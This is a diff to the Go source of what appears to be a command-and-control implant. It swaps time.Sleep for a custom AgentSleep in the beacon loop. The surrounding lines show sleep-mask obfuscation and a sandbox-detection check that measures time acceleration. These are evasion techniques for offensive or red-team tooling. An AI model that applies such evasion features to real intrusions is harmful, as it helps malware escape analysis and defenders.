@@ -410,7 +410,7 @@ func runAgent() {
 				backoffSeconds = 300
 			}
 			sleepTime := calculateSleepTime(backoffSeconds, jitterInt)
-			time.Sleep(sleepTime)
+			commands.AgentSleep(sleepTime)
 			continue
 		}
 		log.Printf("[INFO] Initial checkin successful")
@@ -482,7 +482,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					if sleepMaskEnabled {
 						whVault = obfuscateSleep(agent, c2)
 					}
-					time.Sleep(sleepDuration)
+					commands.AgentSleep(sleepDuration)
 					if sleepMaskEnabled {
 						deobfuscateSleep(whVault, agent, c2)
 					}
@@ -506,7 +506,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					backoffSeconds = maxBackoff
 				}
 				sleepTime := calculateSleepTime(backoffSeconds, agent.Jitter)
-				time.Sleep(sleepTime)
+				commands.AgentSleep(sleepTime)
 				continue
 			}
 
@@ -547,7 +547,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					sleepSkipped = true
 				}
 			} else {
-				time.Sleep(sleepTime)
+				commands.AgentSleep(sleepTime)
 			}
 			if sleepMaskEnabled {
 				deobfuscateSleep(vault, agent, c2)
@@ -835,7 +835,7 @@ func guardedSleep(d time.Duration) bool {
 		return true
 	}
 	before := time.Now()
-	time.Sleep(d)
+	commands.AgentSleep(d)
 	elapsed := time.Since(before)
 	// If less than 75% of the requested duration actually elapsed,
 	// the sandbox is accelerating time.
